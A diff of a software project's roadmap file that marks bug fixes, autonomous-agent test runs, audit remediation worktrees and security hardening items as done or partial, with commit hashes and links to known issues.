 - [x] (2026-03-18) A4.11-A4.12: `trajectory.rollout_complete` event with rollout_count, selected_index, scores, early_stopped; NATS contract fixture updated; 128/128 tests pass
 
@@ -1461,7 +1571,7 @@
 
 #### Bugs Found During Autonomous Goal-to-Program Test (2026-03-19)
 
-> Discovered during S1 testplan execution (`docs/testing/2026-03-19-autonomous-goal-to-program-testplan.md`).
+> Discovered during S1 testplan execution (`docs/testing/autonomous-goal-to-program-testplan.md`).
 > These are product bugs blocking autonomous agent execution end-to-end.
 
 **Bug 1 — Model Router ignores LiteLLM health status (Priority: HIGH) — FIXED 2026-03-19**
@@ -1471,12 +1581,12 @@
 - [x] (2026-03-19) Health-aware model selection added via `_fetch_healthy_models()` in `model_resolver.py`
 
 **Bug 2 — NATS JetStream backlog from cancelled conversations blocks new runs (Priority: CRITICAL) — FIXED 2026-03-19**
-- [x] (2026-03-19) `handleConversationToolCall` now fast-rejects tool calls for cancelled conversation runs via `cancelledConvRuns` sync.Map
+- [x] (2026-03-19) `handleConversationToolCall` now fast-rejects tool calls for cancelled conversation runs via `RunStateManager.cancelledConvs` (`internal/service/run_state.go`); the flag is never cleared, see [KI-24](#known-issues)
 - [x] (2026-03-19) `StopConversation` HTTP handler calls `Runtime.MarkConversationRunCancelled()` which also cleans up HITL approval channels
 - [ ] Consider per-conversation NATS subjects or consumer groups to prevent cross-conversation blocking (future improvement)
 
 **Bug 3 — Worker env var naming inconsistency (Priority: LOW) — FIXED 2026-03-19**
-- [x] (2026-03-19) `LITELLM_URL` vs `LITELLM_BASE_URL` — code reads `LITELLM_BASE_URL`, documented in testplan
+- [x] (2026-03-19) `LITELLM_URL` vs `LITELLM_BASE_URL` — code reads `LITELLM_BASE_URL`, documented in testplan (the devcontainer still sets `LITELLM_URL`, see [KI-50](#known-issues))
 - [x] (2026-03-19) `_conversation.py` inline env reads replaced with `self._litellm_url` from constructor
 - [x] (2026-03-19) `_benchmark.py` inline env reads replaced with `WorkerSettings().litellm_url`
 
@@ -1500,8 +1610,8 @@
 - [x] (2026-03-22) Design spec: 10 phases, 2 modes (A: Weather Dashboard, D: Free Choice), 4-tier verification
 - [x] (2026-03-22) Implementation plan: 11 tasks, 28 steps
 - [x] (2026-03-22) Executable runbook: 11 phases with Playwright-MCP commands, decision trees, report template
-- [ ] First test run: Mode A (Weather Dashboard) with local model
-- [ ] First test run: Mode A with cloud model (Claude/GPT)
+- [x] (2026-03-22) First test run: Mode A (Weather Dashboard) with local model (`lm_studio/qwen/qwen3-30b-a3b`) — `docs/testing/2026-03-22-multi-language-autonomous-report.md`, `docs/testing/2026-03-23-multi-language-autonomous-report.md`
+- [x] (2026-03-23) First test run: Mode A with cloud model (`groq/llama-3.1-8b-instant`, not Claude/GPT) — `docs/testing/2026-03-23-run4b-multi-language-report.md`
 - [ ] First test run: Mode D (Free Choice)
 
 #### Universal Audit Remediation (2026-03-23)
@@ -1518,22 +1628,26 @@
 
 **Remaining Findings — Remediation Work Plans (2026-03-27):**
 
-> Re-audit: `docs/audits/2026-03-27-universal-audit-report.md` (45 findings)
-> Work plans: `docs/plans/2026-03-27-audit-remediation-workplans.md` (10 worktrees)
+> Audit: the F-IDs below come from the 45-finding version of 2026-03-27 (commit 43372899); the current
+> `docs/audits/2026-03-27-universal-audit-report.md` is a 77-finding re-run with SEC-/QUAL-/ARCH-/INFRA-/COMP- IDs.
+> Work plans: `docs/plans/2026-03-27-audit-remediation-workplans.md` (22 worktrees; WT-11..WT-22 are tracked there).
+> Still-open findings re-verified on 2026-09-29 are tracked as [Known Issues](#known-issues): INFRA-001 → KI-47,
+> INFRA-002 → KI-44, SEC-003/SEC-004/INFRA-007/INFRA-008 → KI-14, SEC-008 (WT-12) → KI-12, COMP-014 → KI-54.
 
 **Tier 1 — CRITICAL (parallel):**
-- [ ] **WT-1 `fix/config-secrets`:** F-001/F-003/F-012/F-013/F-018 — `json:"-"` on 10 config fields, JWT blocklist, clear codeforge.yaml secrets, sslmode staging rejection
-- [ ] **WT-2 `fix/nats-trajectory-duplicate`:** F-002 — remove duplicate trajectory subscription, add missing `roadmap_proposed`/`subagent_requested` handlers
+- [x] (2026-03-27, 0de61dbf) **WT-1 `fix/config-secrets`:** F-001/F-003/F-012/F-013/F-018 — `json:"-"` on 10 config fields, JWT blocklist, clear codeforge.yaml secrets, sslmode staging rejection
+- [x] (2026-03-27, 15a2efaf) **WT-2 `fix/nats-trajectory-duplicate`:** F-002 — remove duplicate trajectory subscription, add missing `roadmap_proposed`/`subagent_requested` handlers
 
 **Tier 2 — HIGH (parallel after Tier 1):**
-- [ ] **WT-3 `fix/gdpr-compliance`:** F-008/F-025/F-026/F-027 — audit log anonymization (ADR-009), GDPR service tests, IP retention 180d
-- [ ] **WT-4 `fix/error-handling`:** F-007/F-020 — dashboard swallowed errors (logBestEffort), dead model resolution
-- [ ] **WT-5 `refactor/hexagonal-handlers`:** F-005/F-015/F-016 — extract AllowAlways to PolicyService, filesystem via ports
-- [ ] **WT-6 `test/auth-token`:** F-009 — 11 auth token lifecycle tests (concurrent refresh, reuse detection)
-- [ ] **WT-7 `fix/frontend-compliance`:** F-010/F-036/F-041 — AGPL source link, form aria-labels, centralized API client
+- [x] (2026-03-27, 80cbf266) **WT-3 `fix/gdpr-compliance`:** F-008/F-025/F-026/F-027 — audit log anonymization (ADR-009), GDPR service tests, IP retention 180d (residual defects: [KI-52, KI-53](#known-issues))
+- [x] (2026-03-27, deb9863c) **WT-4 `fix/error-handling`:** F-007/F-020 — dashboard swallowed errors (logBestEffort), dead model resolution
+- [ ] **WT-5 `refactor/hexagonal-handlers`** (partial): F-005/F-015/F-016 — AllowAlways extracted to PolicyService (2026-03-27, a024c503); remaining: move `os.ReadFile` / `os.MkdirAll` / `os.Remove` out of `handlers_goals.go`, `handlers_policy_crud.go` and `PolicyService.AllowAlways` behind the filesystem port
+- [x] (2026-03-27) **WT-6 `test/auth-token`:** F-009 — 11 auth token lifecycle tests in `internal/service/auth_token_test.go`
+- [ ] Add refresh-token reuse-detection and concurrent-refresh race tests (planned in WT-6, not written)
+- [ ] **WT-7 `fix/frontend-compliance`** (partial): F-010/F-036/F-041 — AGPL source link and aria-labels done (2026-03-27, 1875625d); remaining: route the `fetch()` calls in `features/chat/commandStore.ts` and `features/project/RefactorApproval.tsx` through the API client (see [KI-17](#known-issues))
 
 **Tier 3 — MEDIUM (after WT-5):**
-- [ ] **WT-8 `fix/infra-hardening`:** F-004/F-014/F-031/F-040 — JetStream retention limits, Prometheus alerts, backup encryption
+- [x] (2026-03-27, 892da44e) **WT-8 `fix/infra-hardening`:** F-004/F-014/F-031/F-040 — JetStream retention limits, Prometheus alerts, backup encryption
 - [ ] **WT-9 `refactor/type-safety`:** F-019/F-021/F-022/F-037/F-038/F-039 — Python Protocols, Go response structs, flatten nesting
 
 **Tier 4 — BACKLOG (after WT-2):**
@@ -1559,7 +1673,7 @@
 #### Security Hardening (2026-03-24)
 
 - [x] (2026-03-24) **FIX-093:** Add `force_secure_cookies` config flag to `Server` struct -- unconditionally set `Secure=true` on cookies for TLS-terminating proxy deployments. Refactored `isSecureRequest` into `isSecureRequestWithConfig` + `isSecureCookie` method on Handlers. Files: `internal/config/config.go`, `internal/adapter/http/handlers_auth.go`, `internal/adapter/http/handlers.go`
-- [x] (2026-03-24) **FIX-096:** Add per-user rate limiting keyed on JWT user ID -- composite key `userID:IP` for authenticated requests, IP-only fallback for unauthenticated. Auth middleware injects user ID into context at all 5 auth paths. Files: `internal/middleware/ratelimit.go`, `internal/middleware/auth.go`
+- [x] (2026-03-24) **FIX-096:** Add per-user rate limiting keyed on JWT user ID -- composite key `userID:IP` for authenticated requests, IP-only fallback for unauthenticated (the IP part was spoofable until 2026-09-29, [KI-11](#known-issues)). Auth middleware injects user ID into context at all 5 auth paths. Files: `internal/middleware/ratelimit.go`, `internal/middleware/auth.go`
 
 #### v2 API Migration Design (2026-03-24)
 
